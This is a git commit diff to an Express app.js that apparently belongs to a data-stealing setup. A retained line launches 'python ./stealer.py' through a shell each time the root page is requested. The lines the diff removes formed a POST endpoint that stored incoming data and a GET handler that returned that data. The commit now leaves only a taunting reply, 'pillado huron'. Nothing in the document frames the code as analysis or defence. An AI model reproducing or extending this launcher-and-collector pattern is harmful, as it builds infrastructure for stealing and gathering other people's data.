61e8c0cbba130e22080a7937ceb0967e9ceb3a80
Carlos Atienza <72754340+carlosatyca@users.noreply.github.com>
2022-12-06 23:08:35 +0100

    eo

--- app.js
+++ app.js
@@ -14,20 +14,11 @@ app.listen(port, hostname, () => {
   console.log(`Server running at http://${hostname}:${port}/`);
 });
 
-let eo = []
 
 app.get('/', (req, res) => {
   res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
   spawn("python ./stealer.py", { shell: true });
-  if(eo.length > 0){
-    res.send({uo:eo})
-  }else{
-    res.send({uo:"pillado huron"})
-  }
-})
+  res.send({uo:"pillado huron"})
 
-app.post('/', (req, res) => {
-  res.header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type");
-  eo.push(req.body.data)
 })
 
